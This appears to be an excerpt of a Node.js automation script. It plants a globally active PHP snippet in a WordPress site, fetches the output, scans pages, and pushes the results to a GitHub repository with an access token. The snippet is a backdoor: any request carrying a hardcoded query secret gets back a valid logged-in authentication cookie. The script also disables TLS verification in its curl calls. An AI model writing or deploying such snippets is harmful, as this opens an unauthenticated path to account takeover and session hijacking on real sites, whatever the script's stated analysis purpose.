...
function putFile(name,buf){const u='https://api.github.com/repos/'+REPO+'/contents/'+name;let s='';
 for(let i=0;i<6;i++){try{const j=JSON.parse(execSync('curl -sk --max-time 30 -H "Authorization: Bearer '+TOKG+'" "'+u+'?n='+Math.random()+'"',{maxBuffer:80e6}).toString());if(j.sha)s=j.sha;}catch(e){}
  fs.writeFileSync('/tmp/pj.json',JSON.stringify({message:'s458',content:buf.toString('base64'),...(s?{sha:s}:{})}));
...
const O={VERSIJA_RUN:'run458-admin'};
// auth cookie per snippeta
const PHP=`add_action('wp_loaded',function(){
 if(!isset($_GET['ps_ck'])||$_GET['ps_ck']!=='Ck458xQ') return;
 ...
 echo wp_json_encode(array('uid'=>$uid,'login'=>$u[0]->user_login,
   'cookie'=>wp_generate_auth_cookie($uid,$exp,'logged_in'),
   'name'=>LOGGED_IN_COOKIE)); exit;
},1);`;
let sid=null;
fs.writeFileSync('/tmp/sn.json',JSON.stringify({name:'TEMP S458 Cookie v1',code:PHP,scope:'global',active:true}));
...
const ck=sh('curl -sSk --max-time 60 "'+SITE+'/?ps_ck=Ck458xQ"');
 ...
 try{
  ...
  for(const [v,u] of puslapiai){
    try{
      ...
      O.psl[v]={http:rp?rp.status():null, ...info};
...
putFile('analize/s458.json', Buffer.from(JSON.stringify(O,null,1)));
console.log('OK');
